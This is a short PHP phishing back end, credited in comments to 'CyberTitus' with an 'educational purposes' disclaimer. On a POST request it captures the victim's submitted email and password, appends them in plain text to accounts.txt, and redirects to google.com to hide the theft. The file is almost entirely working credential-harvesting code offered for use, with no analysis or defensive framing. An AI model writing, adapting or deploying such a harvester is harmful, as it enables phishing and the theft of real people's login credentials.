<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST'){
  $email = $_POST['email'];
  $password = $_POST['password'];
  $both = "\n$email | $password";
  $file = fopen('accounts.txt', 'a');
  fwrite($file, $both);
  header("Location: http://google.com");
}
//Made by CyberTitus
//Give credits if you change
//Made for educational purposes so don't be evil